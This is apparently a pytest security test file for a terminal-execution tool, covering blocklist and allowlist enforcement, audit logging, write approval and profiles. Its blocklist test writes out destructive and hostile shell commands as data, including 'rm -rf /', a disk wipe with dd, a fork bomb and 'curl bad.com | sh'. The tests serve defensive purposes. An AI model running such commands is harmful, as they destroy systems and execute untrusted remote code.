"""
Security tests for terminal execution tool.

Tests allowlist/blocklist enforcement, audit logging, and approval workflows.
"""

from whitemagic.terminal import Allowlist, Executor


class TestBlocklistEnforcement:
    """Test that dangerous commands are blocked."""

    def test_dangerous_commands_blocked(self, tmp_path):
        """Test blocklist prevents dangerous operations."""
        executor = Executor(profile="prod", audit_dir=tmp_path)

        dangerous_commands = [
            "rm -rf /",
            "dd if=/dev/zero of=/dev/sda",
            ":(){ :|:& };:",  # Fork bomb
            "curl bad.com | sh",
            "chmod 777 /etc/passwd",
            "> /dev/sda",
        ]

        for cmd in dangerous_commands:
            result = executor.execute(cmd, mode="read")
            assert result.blocked is True, f"Should block: {cmd}"
            assert result.exit_code == -1
            assert "BLOCKED" in result.message or "blocked" in result.message.lower()

    def test_write_operations_require_approval(self, tmp_path):
        """Test write operations need explicit approval in prod."""
        executor = Executor(profile="prod", audit_dir=tmp_path)

        write_commands = [
            "echo 'data' > file.txt",
            "touch newfile.txt",
            "mkdir testdir",
        ]

        for cmd in write_commands:
            result = executor.execute(cmd, mode="read")
            assert result.blocked is True or result.requires_approval is True


class TestAllowlistEnforcement:
    """Test that safe commands are allowed."""

    def test_safe_commands_allowed(self, tmp_path):
        """Test safe read-only commands pass."""
        executor = Executor(profile="dev", audit_dir=tmp_path)

        safe_commands = [
            "ls -la",
            "cat /etc/hostname",
            "python3 --version",
            "git status",
            "pwd",
            "echo 'test'",
        ]

        for cmd in safe_commands:
            result = executor.execute(cmd, mode="read")
            # Should not be blocked (may succeed or fail based on environment)
            assert result.blocked is False, f"Should allow: {cmd}"

    def test_dev_profile_more_permissive(self, tmp_path):
        """Test dev profile allows more operations."""
        dev_executor = Executor(profile="dev", audit_dir=tmp_path)
        prod_executor = Executor(profile="prod", audit_dir=tmp_path)

        # Command that's OK in dev but not prod
        cmd = "git push origin test-branch"

        dev_result = dev_executor.execute(cmd, mode="read")
        prod_result = prod_executor.execute(cmd, mode="read")

        # Dev should be more lenient
        assert dev_result.blocked is False or not hasattr(dev_result, "blocked")


class TestAuditLogging:
    """Test audit log completeness and format."""

    def test_all_executions_logged(self, tmp_path):
        """Verify every execution creates audit entry."""
        audit_dir = tmp_path / "audit"
        executor = Executor(profile="dev", audit_dir=audit_dir)

        # Execute several commands
        commands = ["echo test1", "echo test2", "pwd"]
        for cmd in commands:
            executor.execute(cmd, mode="read")

        # Check audit logs exist
        audit_files = list(audit_dir.glob("*.jsonl"))
        assert len(audit_files) > 0, "Audit log file should be created"

        # Read audit entries
        audit_file = audit_files[0]
        entries = audit_file.read_text().strip().split("\n")
        assert len(entries) >= len(commands), f"Should log all {len(commands)} commands"

    def test_audit_log_format(self, tmp_path):
        """Test audit log contains required fields."""
        import json

        audit_dir = tmp_path / "audit"
        executor = Executor(profile="dev", audit_dir=audit_dir)

        executor.execute("echo audit_test", mode="read")

        # Read last audit entry
        audit_files = list(audit_dir.glob("*.jsonl"))
        audit_file = audit_files[0]
        last_entry = audit_file.read_text().strip().split("\n")[-1]
        entry = json.loads(last_entry)

        # Verify required fields
        required_fields = ["timestamp", "command", "exit_code", "profile", "mode"]
        for field in required_fields:
            assert field in entry, f"Audit log missing field: {field}"

        assert entry["command"] == "echo audit_test"

    def test_blocked_commands_logged(self, tmp_path):
        """Test blocked commands are logged with blocked=true."""
        import json

        audit_dir = tmp_path / "audit"
        executor = Executor(profile="prod", audit_dir=audit_dir)

        executor.execute("rm -rf /", mode="read")

        # Check audit entry
        audit_files = list(audit_dir.glob("*.jsonl"))
        audit_file = audit_files[0]
        last_entry = audit_file.read_text().strip().split("\n")[-1]
        entry = json.loads(last_entry)

        assert entry.get("blocked") is True or entry.get("exit_code") == -1


class TestWriteApprovalWorkflow:
    """Test write operations approval flow."""

    def test_write_without_approval_blocked(self, tmp_path):
        """Write ops blocked without approval in prod."""
        executor = Executor(profile="prod", audit_dir=tmp_path)

        result = executor.execute("echo 'data' > /tmp/test_write.txt", mode="read")
        assert result.blocked is True or result.requires_approval is True

    def test_write_with_approval_succeeds(self, tmp_path):
        """Write ops succeed with explicit approval."""
        executor = Executor(profile="prod", audit_dir=tmp_path)

        # Simulate approval (in real system, user would approve)
        result = executor.execute(
            "echo 'approved' > /tmp/test_approved.txt", mode="write", approved=True
        )

        # Should either succeed or require approval (depends on implementation)
        assert result.exit_code != -1 or result.requires_approval is True


class TestProfileBehavior:
    """Test profile-specific behavior."""

    def test_prod_profile_strict(self, tmp_path):
        """Prod profile enforces strict rules."""
        executor = Executor(profile="prod", audit_dir=tmp_path)

        # Should block write operations
        result = executor.execute("touch /tmp/test.txt", mode="read")
        assert result.blocked is True or result.requires_approval is True

    def test_dev_profile_permissive(self, tmp_path):
        """Dev profile allows more operations."""
        executor = Executor(profile="dev", audit_dir=tmp_path)

        # Should allow read operations freely
        result = executor.execute("ls /tmp", mode="read")
        assert result.blocked is False

    def test_read_only_profile(self, tmp_path):
        """Read-only profile blocks all writes."""
        executor = Executor(profile="readonly", audit_dir=tmp_path)

        result = executor.execute("echo test > /tmp/file.txt", mode="read")
        assert result.blocked is True or result.requires_approval is True


class TestAllowlistConfiguration:
    """Test allowlist pattern matching."""

    def test_pattern_matching(self):
        """Test allowlist matches command patterns."""
        allowlist = Allowlist(profile="dev")

        # These should match allowed patterns
        assert allowlist.is_allowed("ls -la")
        assert allowlist.is_allowed("git status")
        assert allowlist.is_allowed("python script.py")

        # These should not match
        assert not allowlist.is_allowed("rm -rf /")
        assert not allowlist.is_allowed("dd if=/dev/zero")

    def test_custom_patterns(self):
        """Test custom allowlist patterns."""
        custom_patterns = [
            "^echo ",
            "^cat ",
            "^grep ",
        ]
        allowlist = Allowlist(profile="custom", patterns=custom_patterns)

        assert allowlist.is_allowed("echo hello")
        assert allowlist.is_allowed("cat file.txt")
        assert not allowlist.is_allowed("rm file.txt")
